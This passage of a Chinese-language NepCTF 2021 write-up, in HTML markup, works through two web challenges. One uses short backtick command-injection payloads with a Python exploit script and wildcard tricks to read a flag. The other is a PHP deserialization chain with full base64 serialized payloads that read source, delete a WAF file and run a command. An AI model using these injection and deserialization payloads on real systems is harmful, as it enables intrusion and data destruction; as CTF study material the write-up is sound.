class="language-none">.&#x2F;?nep&#x3D;&#96;payload&#96;;&amp;len&#x3D;n</code></pre><p>åˆ©ç”¨`åå¼•å·å’Œåˆ†å·;æ‰§è¡Œå‘½ä»¤</p><p>é¦–å…ˆçœ‹åˆ°<code>len</code>ç”¨æ¥æˆªæ–­å­—ç¬¦ä¸²<code>nep</code>ï¼Œè€Œifä¸­<code>intval($len)&lt;8 &amp;&amp; strlen($nep)&lt;13</code>å³é•¿åº¦ä¸ç›¸ç­‰ï¼Œåˆšå¼€å§‹ä»¥ä¸ºéœ€è¦åˆ©ç”¨æ•´å½¢æº¢å‡º</p><blockquote><p>Intvalæœ€å¤§çš„å€¼å–å†³äºæ“ä½œç³»ç»Ÿã€‚ 32 ä½ç³»ç»Ÿæœ€å¤§å¸¦ç¬¦å·çš„ integer èŒƒå›´æ˜¯ -2147483648 åˆ° 2147483647ã€‚ä¸¾ä¾‹ï¼Œåœ¨è¿™æ ·çš„ç³»ç»Ÿä¸Šï¼Œ intval(â€˜1000000000000â€™) ä¼šè¿”å› 2147483647ã€‚64 ä½ç³»ç»Ÿä¸Šï¼Œæœ€å¤§å¸¦ç¬¦å·çš„ integer å€¼æ˜¯ 9223372036854775807ã€‚</p></blockquote><p>æµ‹è¯•äº†ä¸€ä¸‹å‘ç°ä¸å¯¹ï¼Œä¼ å…¥å­—ç¬¦ä¸²è§†ä¸º<strong>å­—ç¬¦ä¸²ç±»å‹</strong>ï¼Œå¹¶ä¸å­˜åœ¨æ•´å½¢æº¢å‡ºï¼Œå¦‚ä¸‹</p><img src="/article/Nepctf2021/image-20210322140444729.png" class="" title="intval" loading="lazy"><p>æ‰€ä»¥æ€è·¯ä¸å¯¹ï¼Œæ¥ä¸‹æ¥æƒ³åˆ°å››å­—ç¬¦RCEï¼Œ<a href="https://blog.csdn.net/q20010619/article/details/109206728">å‚è€ƒæ–‡ç« </a>ï¼Œæµ‹è¯•äº†ä¸€ä¸‹ï¼Œé—®é¢˜æ˜¯æµ‹è¯•ä¸‹æ¥ç›®å½•éå¸¸çš„æ‚ä¹±</p><p>flagå°±åœ¨å½“å‰ç›®å½•ï¼Œæ— æ³•å‡†ç¡®ç›´æ¥catã€‚<strong>æ­¤è„šæœ¬æ— æ•ˆï¼Œä»¥å‰çš„è„šæœ¬ç›´æ¥ç”¨ï¼Œä»…å±•ç¤º</strong></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""-*- coding: utf-8 -*-@File: exp.py@Author: gyy@Time: 3æœˆ 20, 2021"""</span><span class="token keyword">import</span> requestsbaseurl <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:10001/nep2021/little_trick/"</span><span class="token keyword">def</span> <span class="token function">req</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> res<span class="token keyword">def</span> <span class="token function">execit</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> baseurl<span class="token operator">+</span><span class="token string">"?len=7&amp;nep="</span><span class="token operator">+</span>payload    res <span class="token operator">=</span> req<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"long"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> res<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">1</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> req<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    payload0 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'>dir'</span><span class="token punctuation">,</span> <span class="token string">'>f\>'</span><span class="token punctuation">,</span> <span class="token string">'>kt-'</span><span class="token punctuation">,</span> <span class="token string">'>sl'</span><span class="token punctuation">,</span> <span class="token string">'*>v'</span><span class="token punctuation">,</span> <span class="token string">'>rev'</span><span class="token punctuation">,</span> <span class="token string">'*v>b'</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> payload0<span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">'`'</span> <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token string">'`;'</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        execit<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        å¾…ç»­</code></pre><p>è®¿é—®ä¸‹vï¼Œç»“æœä»…èƒ½æ‰«åˆ°ç›®å½•</p><img src="/article/Nepctf2021/image-20210322142144631.png" class="" title="list" loading="lazy"><p>ç›®å½•å˜å¾—éå¸¸ä¹±ï¼Œäºæ˜¯æƒ³ä¸ºä½•ä¸èƒ½åˆ©ç”¨<code>*</code>ç›´æ¥è¯»æ–‡ä»¶å‘¢</p><blockquote><p>è¾“å…¥ç»Ÿé…ç¬¦* ï¼ŒLinuxä¼šæŠŠç¬¬ä¸€ä¸ªåˆ—å‡ºçš„æ–‡ä»¶åå½“ä½œå‘½ä»¤ï¼Œå‰©ä¸‹çš„æ–‡ä»¶åå½“ä½œå‚æ•°</p></blockquote><p>æµ‹è¯•å¦‚ä¸‹</p><img src="/article/Nepctf2021/image-20210322143017075.png" class="" title="test" loading="lazy"><p>æµ‹è¯•å¯è¡Œï¼Œè¾“å‡ºä¸€ä¸ª<code>cat</code>æ–‡ä»¶ï¼Œç„¶åç›®å½•å°±æœ‰<code>cat</code>/<code>index.php</code>/<code>nepctf.php</code>äº†ï¼Œç„¶åæ‰§è¡Œ<code>*&gt;a</code>ï¼Œå³å°†ç›®å½•å†…å®¹å½“ä½œå‘½ä»¤æ‰§è¡Œè¾“å‡ºåˆ°æ–‡ä»¶aï¼Œcatå…¨éƒ¨æ–‡ä»¶ï¼Œç„¶åè®¿é—®æ–‡ä»¶aå³å¯</p><img src="/article/Nepctf2021/image-20210322144032886.png" class="" title="image-20210322144032886" loading="lazy"><hr><h3 id="æ¢¦é‡ŒèŠ±å¼€ç‰¡ä¸¹äº­"><a href="#æ¢¦é‡ŒèŠ±å¼€ç‰¡ä¸¹äº­" class="headerlink" title="æ¢¦é‡ŒèŠ±å¼€ç‰¡ä¸¹äº­"></a>æ¢¦é‡ŒèŠ±å¼€ç‰¡ä¸¹äº­</h3><h4 id="payloadï¼š-1"><a href="#payloadï¼š-1" class="headerlink" title="payloadï¼š"></a>payloadï¼š</h4><pre class="language-none"><code class="language-none">è¯»å–shell.phpï¼š.&#x2F;?a[]&#x3D;1&amp;b[]&#x3D;aPOST:unser&#x3D;Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7TjtzOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086NDoiT3BlbiI6MDp7fXM6ODoiZmlsZW5hbWUiO3M6NDk6InBocDovL2ZpbHRlci9jb252ZXJ0LmJhc2U2NC1lbmNvZGUvcmVzb3VyY2U9c2hlbGwiO3M6NzoiY29udGVudCI7czowOiIiO30&#x3D;---åˆ é™¤waf.txtï¼š.&#x2F;?a[]&#x3D;1&amp;b[]&#x3D;aPOST:unser&#x3D;Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7Tzo1OiJsb2dpbiI6Mzp7czo0OiJmaWxlIjtOO3M6ODoiZmlsZW5hbWUiO047czo3OiJjb250ZW50IjtOO31zOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086MTA6IlppcEFyY2hpdmUiOjU6e3M6Njoic3RhdHVzIjtpOjA7czo5OiJzdGF0dXNTeXMiO2k6MDtzOjg6Im51bUZpbGVzIjtpOjA7czo4OiJmaWxlbmFtZSI7czowOiIiO3M6NzoiY29tbWVudCI7czowOiIiO31zOjg6ImZpbGVuYW1lIjtzOjc6IndhZi50eHQiO3M6NzoiY29udGVudCI7aTo5O30&#x3D;---è¯»å–flagï¼š.&#x2F;?a[]&#x3D;1&amp;b[]&#x3D;aPOST:unser&#x3D;Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7Tzo1OiJsb2dpbiI6Mzp7czo0OiJmaWxlIjtOO3M6ODoiZmlsZW5hbWUiO047czo3OiJjb250ZW50IjtOO31zOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086NDoiT3BlbiI6MDp7fXM6ODoiZmlsZW5hbWUiO3M6Nzoid2FmLnR4dCI7czo3OiJjb250ZW50IjtzOjg6InByIC9mbGFnIjt9æ˜¯ä¸æ˜¯å¾ˆç®€å•ï¼Ÿ</code></pre><p>å¾ˆæ–‡è‰ºçš„åå­—ï¼Œæˆ‘ä¿¡äº†å®ƒã€Šç®€å•çš„PHPååºåˆ—åŒ–ã€‹</p><h4 id="æ€è·¯ï¼š-1"><a href="#æ€è·¯ï¼š-1" class="headerlink" title="æ€è·¯ï¼š"></a>æ€è·¯ï¼š</h4><p>æºç ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'shell.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Game</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span>  <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$choice</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$register</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$content</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token operator">=</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token operator">=</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">register</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token double-quoted-string string">"21232f297a57a5a743894a0e4a801fc3"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">choice</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">login</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">choice</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">choice</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">checking</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">login</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token operator">=</span><span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token operator">=</span><span class="token variable">$filename</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token operator">=</span><span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">checking</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token operator">===</span><span class="token single-quoted-string string">'admin'</span><span class="token operator">&amp;&amp;</span><span class="token variable">$password</span><span class="token operator">===</span><span class="token single-quoted-string string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'login success you can to open shell file!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">register</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">checking</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token operator">===</span><span class="token single-quoted-string string">'admin'</span><span class="token operator">&amp;&amp;</span><span class="token variable">$password</span><span class="token operator">===</span><span class="token single-quoted-string string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'success register admin'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'please register admin '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Open</span><span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'waf.txt'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">shell</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">.</span><span class="token double-quoted-string string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span><span class="token operator">!==</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'unser'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>åˆ†æä¸‹ï¼Œé¦–å…ˆè¦ç»•<code>$_GET[&#39;a&#39;]!==$_GET[&#39;b&#39;]&amp;&amp;(md5($_GET[&#39;a&#39;]) === md5($_GET[&#39;b&#39;])) &amp;&amp; (sha1($_GET[&#39;a&#39;])=== sha1($_GET[&#39;b&#39;]))</code>ï¼Œç›´æ¥æ•°ç»„ç»•è¿‡ï¼Œä¼ å…¥<code>./?a[]=1&amp;b[]=a</code>å³å¯ï¼Œå¦‚ä¸‹</p><img src="/article/Nepctf2021/image-20210322152923642.png" class="" title="shuzu" loading="lazy"><h5 id="è¯»å–shell-phpï¼š"><a href="#è¯»å–shell-phpï¼š" class="headerlink" title="è¯»å–shell.phpï¼š"></a>è¯»å–shell.phpï¼š</h5><p>çœ‹Gameç±»</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Game</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span>  <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$choice</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$register</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$content</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token operator">=</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token operator">=</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">register</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token double-quoted-string string">"21232f297a57a5a743894a0e4a801fc3"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">choice</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">login</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">choice</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">choice</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">checking</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>çœ‹åˆ°<code>__wakeup</code>ç¬¬ä¸€ååº”å¯ä¸å¯ä»¥ç›´æ¥ç»•ï¼Œçœ‹äº†ä¸‹ç‰ˆæœ¬<code>PHP/7.0.33</code></p><blockquote><p>CVE-2016-7124ååºåˆ—åŒ–ç»•è¿‡wakeupæ¼æ´ã€‚<br>å½±å“ç‰ˆæœ¬ï¼šPHP5 &lt; 5.6.25 PHP7 &lt; 7.0.10</p></blockquote><p>ä¹–ä¹–èµ°<code>__wakeup</code>ï¼Œregisterç±»æ²¡æœ‰ä½œç”¨ï¼Œçœ‹æ¥å¾—èµ°loginç±»</p><p>å‚æ•°<code>register</code>çš„md5è¦ä¸º<code>21232f297a57a5a743894a0e4a801fc3</code>ï¼Œä¸€æŸ¥ï¼Œ<code>admin</code></p><p>é‚£å°±æ²¡é—®é¢˜äº†ï¼Œ<code>__wakeup</code>å°†Gameç±»çš„<code>file</code>/<code>filename</code>/<code>content</code>ä¼ å…¥loginï¼Œåˆ©ç”¨loginçš„<code>__construct</code>èµ‹å€¼</p><p>Gameç±»çš„å˜é‡choiceå³loginç±»ï¼Œåˆ©ç”¨Gameç±»<code>__destruct</code>è§¦å‘loginç±»çš„checkingå‡½æ•°</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">login</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token operator">=</span><span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token operator">=</span><span class="token variable">$filename</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token operator">=</span><span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">checking</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token operator">===</span><span class="token single-quoted-string string">'admin'</span><span class="token operator">&amp;&amp;</span><span class="token variable">$password</span><span class="token operator">===</span><span class="token single-quoted-string string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'login success you can to open shell file!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>loginç±»çš„checkingå‡½æ•°æ£€æŸ¥èµ‹å€¼çš„usernameå’Œpasswordï¼Œå³Gameç±»ä¼ è¿‡æ¥çš„usernameå’Œpasswordã€‚ç„¶åè°ƒç”¨fileå³Gameç±»çš„fileçš„openå‡½æ•°ã€‚ç”±äºæ²¡æœ‰<code>__call</code>ä¹‹ç±»çš„é­”æœ¯æ–¹æ³•ï¼Œä¸éœ€è¦è€ƒè™‘å…¶ä»–ã€‚å³æœ¬é¢˜æ‰€æœ‰å˜é‡éƒ½å¯åœ¨Gameç±»ç›´æ¥èµ‹å€¼ã€‚</p><p>å…³é”®ç‚¹å°±åœ¨äºOpenç±»äº†</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Open</span><span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'waf.txt'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">shell</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">.</span><span class="token double-quoted-string string">".php"</span><span class="token punctuation">)</span><span class="token 